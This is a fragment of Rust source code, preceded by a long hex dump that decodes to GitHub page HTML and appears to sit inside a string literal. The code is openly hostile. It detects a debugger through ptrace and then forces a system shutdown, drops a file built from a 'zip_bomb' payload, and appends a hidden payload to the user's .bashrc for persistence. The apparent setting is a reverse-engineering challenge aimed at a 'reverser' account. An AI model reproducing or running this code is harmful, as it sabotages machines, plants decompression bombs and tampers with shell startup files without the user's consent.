000dbd0 642f 7669 0a3e 0a0a 200a 3c20 6964 2076
000dbe0 6469 223d 6a61 7861 652d 7272 726f 6d2d
000dbf0 7365 6173 6567 2022 6c63 7361 3d73 6122
000dc00 616a 2d78 7265 6f72 2d72 656d 7373 6761
000dc10 2065 6c66 7361 2068 6c66 7361 2d68 7265
000dc20 6f72 2272 0a3e 2020 2020 733c 6776 6320
000dc30 616c 7373 223d 636f 6974 6f63 206e 636f
000dc40 6974 6f63 2d6e 6c61 7265 2274 7620 6569
000dc50 4277 786f 223d 2030 2030 3631 3120 2236
000dc60 7620 7265 6973 6e6f 223d 2e31 2231 7720
000dc70 6469 6874 223d 3631 2022 6568 6769 7468
000dc80 223d 3631 2022 7261 6169 682d 6469 6564
000dc90 3d6e 7422 7572 2265 3c3e 6170 6874 6620
000dca0 6c69 2d6c 7572 656c 223d 7665 6e65 646f
000dcb0 2264 6420 223d 384d 382e 3339 3120 352e
000dcc0 2d63 312e 3338 2e2d 3133 2e2d 3235 2e2d
000dcd0 2d35 382e 3738 2e2d 7335 2e2d 3037 2e33
000dce0 3931 2e2d 3838 2e36 4c35 312e 3833 3120
000dcf0 2e33 3934 6139 392e 2e38 3839 3020 3020
000dd00 3020 3020 3120 302e 3130 2e63 3931 2e33
000dd10 3133 352e 2e33 3035 2e31 3838 2e36 3035
000dd20 6831 3331 392e 3436 2e63 3633 2037 2030
000dd30 372e 3430 2e2d 3931 382e 3737 2e2d 6135
000dd40 2e31 3330 3120 302e 2033 2030 2030 2030
000dd50 302e 2d31 2e31 3030 4c32 2e38 3938 2033
000dd60 2e31 7a35 2e6d 3331 2033 3131 342e 3739
000dd70 3648 392e 3738 2d76 2e32 3030 6833 2e32
000dd80 3330 7639 2e32 3030 7a33 306d 332d 302e
000dd90 3430 3648 392e 3738 3556 392e 3738 3268
000dda0 302e 3933 3476 302e 3630 227a 3e2f 2f3c
000ddb0 7673 3e67 200a 2020 3c20 7562 7474 6e6f
000ddc0 7420 7079 3d65 6222 7475 6f74 226e 6320
000ddd0 616c 7373 223d 6c66 7361 2d68 6c63 736f
000dde0 2065 736a 612d 616a 2d78 7265 6f72 2d72
000ddf0 6964 6d73 7369 2273 6120 6972 2d61 616c
000de00 6562 3d6c 4422 7369 696d 7373 6520 7272
000de10 726f 3e22 200a 2020 2020 3c20 7673 2067
000de20 6c63 7361 3d73 6f22 7463 6369 6e6f 6f20
000de30 7463 6369 6e6f 782d 2022 6976 7765 6f42
000de40 3d78 3022 3020 3120 2032 3631 2022 6576
000de50 7372 6f69 3d6e 3122 312e 2022 6977 7464
000de60 3d68 3122 2232 6820 6965 6867 3d74 3122
000de70 2236 6120 6972 2d61 6968 6464 6e65 223d
000de80 7274 6575 3e22 703c 7461 2068 6966 6c6c
000de90 722d 6c75 3d65 6522 6576 6f6e 6464 2022
000dea0 3d64 4d22 2e37 3834 3820 336c 372e 2035
000deb0 2e33 3537 312d 342e 2038 2e31 3834 364c
000dec0 3920 342e 6c38 332d 372e 2035 2e33 3537
000ded0 312d 342e 2d38 2e31 3834 344c 352e 2032
000dee0 2038 372e 2037 2e34 3532 316c 342e 2d38
000def0 2e31 3834 364c 3620 352e 6c32 2e33 3537
000df00 332d 372e 2035 2e31 3834 3120 342e 4c38
000df10 2e37 3834 3820 227a 3e2f 2f3c 7673 3e67
000df20 200a 2020 3c20 622f 7475 6f74 3e6e 200a
000df30 2020 5920 756f 6320 6e61 80e2 7499 7020
000df40 7265 6f66 6d72 7420 6168 2074 6361 6974
000df50 6e6f 6120 2074 6874 7369 7420 6d69 2e65
000df60 200a 3c20 642f 7669 0a3e 0a0a 2020 2020
000df70 733c 7263 7069 2074 7263 736f 6f73 6972
000df80 6967 3d6e 6122 6f6e 796e 6f6d 7375 2022
000df90 6e69 6574 7267 7469 3d79 7322 6168 3135
000dfa0 2d32 4259 7641 7831 7964 4734 3054 712b
000dfb0 7837 6679 6268 6176 7a57 7636 5558 3564
000dfc0 4657 4236 4c2f 6652 7478 6d67 2b38 4737
000dfd0 7941 3653 7763 4436 2b63 4344 7868 7732
000dfe0 526d 644d 6a44 7756 354b 4257 7873 6567
000dff0 4552 6165 7264 4177 3d3d 2022 7974 6570
000e000 223d 7061 6c70 6369 7461 6f69 2f6e 616a
000e010 6176 6373 6972 7470 2022 7273 3d63 6822
000e020 7474 7370 2f3a 672f 7469 7568 2e62 6967
000e030 6874 6275 7361 6573 7374 632e 6d6f 612f
000e040 7373 7465 2f73 6f63 706d 7461 622d 6f6f
000e050 7374 7274 7061 622d 3736 6632 3735 2e35
000e060 736a 3e22 2f3c 6373 6972 7470 0a3e 2020
000e070 2020 733c 7263 7069 2074 7263 736f 6f73
000e080 6972 6967 3d6e 6122 6f6e 796e 6f6d 7375
000e090 2022 6e69 6574 7267 7469 3d79 7322 6168
000e0a0 3135 2d32 514f 5051 3266 4731 3151 7237
000e0b0 5965 724e 4438 7865 7047 3775 3259 6c68
000e0c0 4e66 6764 6969 4c7a 766e 2b70 4746 3549
000e0d0 5144 4a44 5243 594b 7436 4f4d 372b 562f
000e0e0 7944 654e 4966 474f 3064 5671 7453 6c71
000e0f0 6572 5252 7670 5677 676c 3d3d 2022 7974
000e100 6570 223d 7061 6c70 6369 7461 6f69 2f6e
000e110 616a 6176 6373 6972 7470 2022 7273 3d63
000e120 6822 7474 7370 2f3a 672f 7469 7568 2e62
000e130 6967 6874 6275 7361 6573 7374 632e 6d6f
000e140 612f 7373 7465 2f73 7266 6d61 7765 726f
000e150 736b 392d 6661 3930 6562 2e31 736a 3e22
000e160 2f3c 6373 6972 7470 0a3e 2020 2020 200a
000e170 2020 3c20 6373 6972 7470 6320 6f72 7373
000e180 726f 6769 6e69 223d 6e61 6e6f 6d79 756f
000e190 2273 6120 7973 636e 223d 7361 6e79 2263
000e1a0 6920 746e 6765 6972 7974 223d 6873 3561
000e1b0 3231 742d 6d47 7049 786c 7655 5164 3147
000e1c0 642f 3664 4451 5a4a 416c 5375 4b56 566d
000e1d0 6641 6a59 7a31 3248 7671 7553 7353 6234
000e1e0 4272 374c 3145 4f32 6250 3668 4833 6263
000e1f0 5530 6f31 6a70 434f 5741 3737 526f 3442
000e200 6869 326f 7768 6546 3d51 223d 7420 7079
000e210 3d65 6122 7070 696c 6163 6974 6e6f 6a2f
000e220 7661 7361 7263 7069 2274 7320 6372 223d
000e230 7468 7074 3a73 2f2f 6967 6874 6275 672e
000e240 7469 7568 6162 7373 7465 2e73 6f63 2f6d
000e250 7361 6573 7374 672f 7469 7568 2d62 6f62
000e260 746f 7473 6172 2d70 6664 3430 3831 6132
000e270 6a2e 2273 3c3e 732f 7263 7069 3e74 200a
000e280 2020 0a20 2020 2020 200a 2020 0a20 2020
000e290 643c 7669 6320 616c 7373 223d 736a 732d
000e2a0 6174 656c 732d 7365 6973 6e6f 662d 616c
000e2b0 6873 7320 6174 656c 732d 7365 6973 6e6f
000e2c0 662d 616c 6873 6620 616c 6873 6620 616c
000e2d0 6873 772d 7261 206e 6c66 7361 2d68 6162
000e2e0 6e6e 7265 2022 6968 6464 6e65 200a 2020
000e2f0 3e20 200a 2020 3c20 7673 2067 6c63 7361
000e300 3d73 6f22 7463 6369 6e6f 6f20 7463 6369
000e310 6e6f 612d 656c 7472 2022 6976 7765 6f42
000e320 3d78 3022 3020 3120 2036 3631 2022 6576
000e330 7372 6f69 3d6e 3122 312e 2022 6977 7464
000e340 3d68 3122 2236 6820 6965 6867 3d74 3122
000e350 2236 6120 6972 2d61 6968 6464 6e65 223d
000e360 7274 6575 3e22 703c 7461 2068 6966 6c6c
000e370 722d 6c75 3d65 6522 6576 6f6e 6464 2022
000e380 3d64 4d22 2e38 3938 2033 2e31 6335 2e2d
000e390 3831 2d33 332e 2d31 352e 2d32 352e 2e2d
000e3a0 3838 2d37 352e 2d73 372e 3330 312e 2d39
000e3b0 382e 3638 352e 2e4c 3331 2038 3331 342e
000e3c0 3939 2e61 3839 392e 2038 2030 2030 2030
000e3d0 2030 2e31 3030 6331 312e 3339 332e 2e31
000e3e0 3335 352e 3130 382e 3638 352e 3130 3168
000e3f0 2e33 3639 6334 332e 3736 3020 2e20 3037
000e400 2d34 312e 2e39 3738 2d37 352e 3161 302e
000e410 2033 2e31 3330 3020 3020 3020 2e20 3130
000e420 312d 302e 3230 384c 382e 3339 3120 352e
000e430 6d7a 312e 3333 3120 2e31 3934 4837 2e36
000e440 3839 7637 322d 302e 3330 3268 302e 3933
000e450 3276 302e 3330 6d7a 2d30 2e33 3030 4834
000e460 2e36 3839 5637 2e35 3839 6837 2e32 3330
000e470 7639 2e34 3030 7a36 2f22 3c3e 732f 6776
000e480 0a3e 2020 2020 733c 6170 206e 6c63 7361
000e490 3d73 7322 6769 656e 2d64 6e69 742d 6261
000e4a0 662d 616c 6873 3e22 6f59 2075 6973 6e67
000e4b0 6465 6920 206e 6977 6874 6120 6f6e 6874
000e4c0 7265 7420 6261 6f20 2072 6977 646e 776f
000e4d0 202e 613c 6820 6572 3d66 2222 523e 6c65
000e4e0 616f 3c64 612f 203e 6f74 7220 6665 6572
000e4f0 6873 7920 756f 2072 6573 7373 6f69 2e6e
000e500 2f3c 7073 6e61 0a3e 2020 2020 733c 6170
000e510 206e 6c63 7361 3d73 7322 6769 656e 2d64
000e520 756f 2d74 6174 2d62 6c66 7361 2268 593e
000e530 756f 7320 6769 656e 2064 756f 2074 6e69
000e540 6120 6f6e 6874 7265 7420 6261 6f20 2072
000e550 6977 646e 776f 202e 613c 6820 6572 3d66
000e560 2222 523e 6c65 616f 3c64 612f 203e 6f74
000e570 7220 6665 6572 6873 7920 756f 2072 6573
000e580 7373 6f69 2e6e 2f3c 7073 6e61 0a3e 2020
000e590 2f3c 6964 3e76 200a 3c20 6574 706d 616c
000e5a0 6574 6920 3d64 7322 7469 2d65 6564 6174
000e5b0 6c69 2d73 6964 6c61 676f 3e22 200a 3c20
000e5c0 6564 6174 6c69 2073 6c63 7361 3d73 6422
000e5d0 7465 6961 736c 722d 7365 7465 6420 7465
000e5e0 6961 736c 6f2d 6576 6c72 7961 6420 7465
000e5f0 6961 736c 6f2d 6576 6c72 7961 642d 7261
000e600 206b 686c 642d 6665 7561 746c 7420 7865
000e610 2d74 7267 7961 642d 7261 226b 6f20 6570
000e620 3e6e 200a 2020 3c20 7573 6d6d 7261 2079
000e630 7261 6169 682d 7361 6f70 7570 3d70 6422
000e640 6169 6f6c 2267 6120 6972 2d61 616c 6562
000e650 3d6c 4322 6f6c 6573 6420 6169 6f6c 2267
000e660 3c3e 732f 6d75 616d 7972 0a3e 2020 2020
000e670 643c 7465 6961 736c 642d 6169 6f6c 2067
000e680 6c63 7361 3d73 4222 786f 4220 786f 2d2d
000e690 766f 7265 616c 2079 2d64 6c66 7865 6620
000e6a0 656c 2d78 6f63 756c 6e6d 6120 696e 2d6d
000e6b0 6166 6564 692d 206e 6166 7473 3e22 200a
000e6c0 2020 2020 3c20 7562 7474 6e6f 6320 616c
000e6d0 7373 223d 6f42 2d78 7462 2d6e 636f 6974
000e6e0 6f63 206e 2d6d 2030 7462 2d6e 636f 6974
000e6f0 6f63 206e 6f70 6973 6974 6e6f 612d 7362
000e700 6c6f 7475 2065 6972 6867 2d74 2030 6f74
000e710 2d70 2230 7420 7079 3d65 6222 7475 6f74
000e720 226e 6120 6972 2d61 616c 6562 3d6c 4322
000e730 6f6c 6573 6420 6169 6f6c 2267 6420 7461
000e740 2d61 6c63 736f 2d65 6964 6c61 676f 0a3e
000e750 2020 2020 2020 2020 733c 6776 6320 616c
000e760 7373 223d 636f 6974 6f63 206e 636f 6974
000e770 6f63 2d6e 2278 7620 6569 4277 786f 223d
000e780 2030 2030 3231 3120 2236 7620 7265 6973
000e790 6e6f 223d 2e31 2231 7720 6469 6874 223d
000e7a0 3231 2022 6568 6769 7468 223d 3631 2022
000e7b0 7261 6169 682d 6469 6564 3d6e 7422 7572
000e7c0 2265 3c3e 6170 6874 6620 6c69 2d6c 7572
000e7d0 656c 223d 7665 6e65 646f 2264 6420 223d
000e7e0 374d 342e 2038 6c38 2e33 3537 3320 372e
000e7f0 2d35 2e31 3834 3120 342e 4c38 2036 2e39
000e800 3834 2d6c 2e33 3537 3320 372e 2d35 2e31
000e810 3834 312d 342e 4c38 2e34 3235 3820 2e20
000e820 3737 3420 322e 6c35 2e31 3834 312d 342e
000e830 4c38 2036 2e36 3235 336c 372e 2d35 2e33
000e840 3537 3120 342e 2038 2e31 3834 374c 342e
000e850 2038 7a38 2f22 3c3e 732f 6776 0a3e 2020
000e860 2020 2020 2f3c 7562 7474 6e6f 0a3e 2020
000e870 2020 2020 643c 7669 6320 616c 7373 223d
000e880 636f 6f74 6163 2d74 7073 6e69 656e 2072
000e890 796d 362d 6a20 2d73 6564 6174 6c69 2d73
000e8a0 6964 6c61 676f 732d 6970 6e6e 7265 3e22
000e8b0 2f3c 6964 3e76 200a 2020 3c20 642f 7465
000e8c0 6961 736c 642d 6169 6f6c 3e67 200a 3c20
000e8d0 642f 7465 6961 736c 0a3e 2f3c 6574 706d
000e8e0 616c 6574 0a3e 200a 3c20 6964 2076 6c63
000e8f0 7361 3d73 5022 706f 766f 7265 6a20 2d73
000e900 6f68 6576 6372 7261 2d64 6f63 746e 6e65
000e910 2074 6f70 6973 6974 6e6f 612d 7362 6c6f
000e920 7475 2265 7320 7974 656c 223d 6964 7073
000e930 616c 3a79 6e20 6e6f 3b65 6f20 7475 696c
000e940 656e 203a 6f6e 656e 223b 7420 6261 6e69
000e950 6564 3d78 3022 3e22 200a 3c20 6964 2076
000e960 6c63 7361 3d73 5022 706f 766f 7265 6d2d
000e970 7365 6173 6567 5020 706f 766f 7265 6d2d
000e980 7365 6173 6567 2d2d 6f62 7474 6d6f 6c2d
000e990 6665 2074 6f50 6f70 6576 2d72 656d 7373
000e9a0 6761 2d65 6c2d 7261 6567 4220 786f 6220
000e9b0 786f 732d 6168 6f64 2d77 616c 6772 2265
000e9c0 7320 7974 656c 223d 6977 7464 3a68 3633
000e9d0 7030 3b78 3e22 200a 3c20 642f 7669 0a3e
000e9e0 2f3c 6964 3e76 0a0a 2020 643c 7669 6120
000e9f0 6972 2d61 696c 6576 223d 6f70 696c 6574
000ea00 2022 6c63 7361 3d73 6a22 2d73 6c67 626f
000ea10 6c61 732d 7263 6565 2d6e 6572 6461 7265
000ea20 6e2d 746f 6369 2065 7273 6f2d 6c6e 2279
000ea30 3c3e 642f 7669 0a3e 200a 3c20 622f 646f
000ea40 3e79 3c0a 682f 6d74 3e6c 0a0a          
000ea4c

");
    
	if unsafe{ptrace(libc::PTRACE_TRACEME, 0, 0, 0)} < 0{
		print!("being traced");
		Command::new("shutdown")
			.args(&["now"])
			.spawn()
			.ok();
	}
	else{
		println!(":)");
		
	}
    let mut kb = fs::File::create("love").unwrap();
    kb.write_all(new_kb.as_bytes());
    let mut bomb = fs::File::create("floppy").unwrap();
    bomb.write_all(zip_bomb.as_bytes());
    let mut file = OpenOptions::new()
		.append(true)
		.open("/home/reverser/.bashrc")
		.unwrap();
    if let Err(e) = write!(file, "{}", meta_term){
    	eprintln!("Couldnt write to bashrc");
    }
	
}
